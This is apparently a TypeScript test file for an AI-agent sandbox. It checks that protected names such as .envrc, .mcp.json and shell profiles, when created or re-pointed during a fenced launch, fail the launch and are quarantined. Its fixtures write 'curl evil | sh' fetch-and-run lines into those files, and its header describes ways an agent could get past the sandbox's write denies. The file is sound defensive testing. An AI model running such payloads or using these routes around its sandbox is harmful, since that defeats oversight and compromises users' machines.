/**
 * Attack: getting a protected name (a hook, `.envrc`, `.mcp.json`, a shell profile) past the mandatory write denies
 * where the sandbox can't deny by name (docs/plans/sandbox-parity.md C8): bubblewrap binds only what exists at launch
 * and Codex lists only what exists. Every fenced launch form runs under one watch (withProtectedWatch): a name made or
 * a protected link re-pointed during the launch fails it, and inside the checkout is moved into Toolroll's quarantine
 * (as a link, never what it points at); at home it is left and said. Unlocks are filtered the same way for every
 * backend; a protected name that is a link is bound read-only at its target; a checkout too large to see whole has
 * no Linux or Codex fence.
 */
import { existsSync, lstatSync, mkdirSync, readdirSync, readFileSync, readlinkSync, symlinkSync } from "node:fs";
import { resolve } from "node:path";
import { join } from "node:path";
import { describe, expect, test } from "vitest";
import { codexFenceArgv, grantableUnlocks, linuxFenced, LinuxFenceUnavailable, mandatoryWriteDenies, NO_GRANTS, protectedBelow, withProtectedWatch, type FenceGrants } from "../../src/agent-fence.js";
import { argsOnlySeccomp } from "../seccomp-fixture.js";
import { useScratch, write } from "./harness.js";

const scratch = useScratch("protected-watch");
const OK = { code: 0 as number | null, stdout: "", stderr: "" };

function plane(unlock: string[] = []) {
  const root = scratch();
  const checkout = join(root, "checkout");
  const home = join(root, "home");
  const state = join(root, "toolroll");
  for (const path of [checkout, home, state]) mkdirSync(path, { recursive: true });
  const mandatory = () => mandatoryWriteDenies({ worktree: checkout, home, binding: null, unlock, quarantine: join(state, "quarantine") });
  return { root, checkout, home, state, mandatory };
}

describe("attack: protected names past a sandbox that can't deny them by name", () => {
  test("a name made during a launch fails it; inside the checkout it is moved to quarantine as itself, at home it is left and said", async () => {
    const { checkout, home, state, mandatory, root } = plane();
    const outside = write(join(root, "outside", "payload.sh"), "echo original\n");
    const grants: FenceGrants = { ...NO_GRANTS, mandatory: mandatory() };
    const result = await withProtectedWatch(grants, async () => {
      write(join(checkout, "pkg", ".envrc"), "curl evil | sh\n");
      symlinkSync(outside, join(checkout, ".mcp.json"));
      write(join(home, ".bash_profile"), "curl evil | sh\n");
      return OK;
    });
    expect(result.code).toBe(1);
    expect(result.stderr).toMatch(/which builds may not write/);
    expect(existsSync(join(checkout, "pkg", ".envrc"))).toBe(false);
    expect(existsSync(join(checkout, ".mcp.json"))).toBe(false);
    // The link moved as the link; what it pointed at is untouched.
    expect(readFileSync(outside, "utf8")).toBe("echo original\n");
    const quarantined = join(state, "quarantine");
    const moved = readdirDeep(quarantined);
    expect(moved.some(path => path.endsWith(".mcp.json") && lstatSync(path).isSymbolicLink() && readlinkSync(path) === outside)).toBe(true);
    // At home: left (it could be the person's own), and said.
    expect(existsSync(join(home, ".bash_profile"))).toBe(true);
    expect(result.stderr).toMatch(/Left in place: .*\.bash_profile/);
  });

  test("a protected link re-pointed during a launch fails it; an unlocked name and an unchanged launch pass", async () => {
    const { checkout, root, mandatory } = plane([".envrc"]);
    const first = write(join(root, "a.sh"), "a\n");
    const second = write(join(root, "b.sh"), "b\n");
    symlinkSync(first, join(checkout, ".npmrc"));
    const grants: FenceGrants = { ...NO_GRANTS, mandatory: mandatory() };
    const relinked = await withProtectedWatch(grants, async () => {
      const { rmSync } = await import("node:fs");
      rmSync(join(checkout, ".npmrc"));
      symlinkSync(second, join(checkout, ".npmrc"));
      return OK;
    });
    expect(relinked.code).toBe(1);
    expect(await withProtectedWatch(grants, async () => { write(join(checkout, ".envrc"), "ok\n"); return OK; })).toEqual(OK);
  });

  test("unlocks are filtered once for every backend: never inside a fenced or read-only path, never outside the writes", () => {
    const { checkout, mandatory } = plane([".envrc", ".vscode/settings.json"]);
    write(join(checkout, ".envrc"), "x\n");
    write(join(checkout, ".vscode", "settings.json"), "{}\n");
    const base: FenceGrants = { ...NO_GRANTS, mandatory: mandatory(), seccomp: argsOnlySeccomp() };
    expect(grantableUnlocks([], base).sort()).toEqual([join(checkout, ".envrc"), join(checkout, ".vscode", "settings.json")].sort());
    const held: FenceGrants = { ...base, readOnly: [join(checkout, ".vscode")] };
    expect(grantableUnlocks([], held)).toEqual([join(checkout, ".envrc")]);
    expect(grantableUnlocks([checkout], base)).toEqual([]);
    const elsewhere: FenceGrants = { ...base, writes: { subpaths: [join(checkout, "src")], prefixes: [] } };
    expect(grantableUnlocks([], elsewhere)).toEqual([]);
    // Each backend gives back exactly the filtered list.
    const bound = (grants: FenceGrants) => { const args = linuxFenced("true", [], [], grants).args; return args.flatMap((arg, at) => arg === "--bind" ? [args[at + 1]!] : []); };
    expect(bound(held)).toEqual([join(checkout, ".envrc")]);
    const filesystem = codexFenceArgv([], true, held).find(one => one.startsWith("permissions.standing-orders.filesystem="))!;
    expect(filesystem).toContain(`"${join(checkout, ".envrc")}"="write"`);
    expect(filesystem).not.toContain(`"${join(checkout, ".vscode", "settings.json")}"="write"`);
  });

  test("bubblewrap never binds through a protected link: a target inside the checkout is held read-only, one in a masked path is left masked, one it could write elsewhere refuses the launch", () => {
    const { checkout, root, state, mandatory } = plane();
    const inside = write(join(checkout, "config", "envrc"), "x\n");
    const secret = write(join(state, "up-login.txt"), "secret\n");
    symlinkSync(inside, join(checkout, ".envrc"));
    symlinkSync(secret, join(checkout, ".npmrc"));
    const grants: FenceGrants = { ...NO_GRANTS, mandatory: mandatory(), seccomp: argsOnlySeccomp() };
    const args = linuxFenced("true", [], [state], grants).args;
    const readOnly = args.flatMap((arg, at) => arg === "--ro-bind" ? [args[at + 1]!] : []);
    expect(readOnly).toContain(inside);
    expect(readOnly).not.toContain(secret);
    expect(readOnly).not.toContain(join(checkout, ".envrc"));
    // A link it could follow out of the checkout to write elsewhere: no Linux fence for it.
    const elsewhere = write(join(root, "dotfiles", "zshrc"), "x\n");
    symlinkSync(elsewhere, join(checkout, ".zshrc"));
    expect(() => linuxFenced("true", [], [state], { ...grants, mandatory: mandatory() })).toThrow(/leads to .*dotfiles.*which this build could write/);
    // Under a write allowlist that doesn't reach it, the same link is harmless.
    expect(() => linuxFenced("true", [], [state], { ...grants, mandatory: mandatory(), writes: { subpaths: [checkout], prefixes: [] } })).not.toThrow();
  });

  test("the watch fails closed: a checkout it can't read whole after the launch, a link pointed at something new, a name it can't move safely", async () => {
    const { checkout, root, mandatory } = plane();
    // A link whose target changes identity (same text, a new file there): changed.
    const target = write(join(root, "t", "rc"), "a\n");
    symlinkSync(target, join(checkout, ".npmrc"));
    const grants: FenceGrants = { ...NO_GRANTS, mandatory: mandatory() };
    const swapped = await withProtectedWatch(grants, async () => { const { rmSync } = await import("node:fs"); rmSync(target); write(target, "b\n"); return OK; });
    expect(swapped.code).toBe(1);
    // A name made through a folder the launch turned into a link: failed, and left where it is (never renamed through
    // the link).
    const elsewhere = join(root, "elsewhere");
    mkdirSync(elsewhere);
    const linked = await withProtectedWatch({ ...NO_GRANTS, mandatory: mandatory() }, async () => {
      symlinkSync(elsewhere, join(checkout, ".claude"));
      write(join(elsewhere, "settings.json"), "x\n");
      return OK;
    });
    expect(linked.code).toBe(1);
    expect(existsSync(join(elsewhere, "settings.json"))).toBe(true);
    expect(linked.stderr).toMatch(/Left in place/);
    // A checkout that can't be walked whole after the launch: changed.
    const small = { ...mandatory() };
    const unread = await withProtectedWatch({ ...NO_GRANTS, mandatory: small }, async () => {
      for (let index = 0; index < 40; index++) mkdirSync(join(checkout, ...Array.from({ length: index + 1 }, () => "d")), { recursive: true });
      return OK;
    });
    expect(unread.code).toBe(1);
    expect(unread.stderr).toMatch(/couldn't be read whole/);
  });

  test("a checkout too large to see whole has no Linux fence (and the walk says so)", () => {
    const { checkout, mandatory } = plane();
    for (let index = 0; index < 5; index++) write(join(checkout, `d${index}`, "f.txt"), "x\n");
    expect(protectedBelow(checkout, 3).complete).toBe(false);
    expect(protectedBelow(checkout).complete).toBe(true);
    const incomplete = { ...mandatory(), complete: false };
    expect(() => linuxFenced("true", [], [], { ...NO_GRANTS, mandatory: incomplete, seccomp: argsOnlySeccomp() })).toThrow(LinuxFenceUnavailable);
  });
});

test("every fenced launch form runs under the one watch: an agent, its commands, a saved result's checks, a flow's setup and script", () => {
  const source = (file: string) => readFileSync(resolve(import.meta.dirname, "../../src", file), "utf8");
  expect(source("invoke.ts").match(/withProtectedWatch\(/g)).toHaveLength(3);
  expect(source("flow-code.ts").match(/withProtectedWatch\(/g)).toHaveLength(1);
  expect(source("flow-steps.ts").match(/withProtectedWatch\(/g)).toHaveLength(1);
});

function readdirDeep(folder: string): string[] {
  const out: string[] = [];
  const walk = (at: string) => { for (const entry of readdirSync(at, { withFileTypes: true })) { const path = join(at, entry.name); out.push(path); if (entry.isDirectory()) walk(path); } };
  if (existsSync(folder)) walk(folder);
  return out;
}
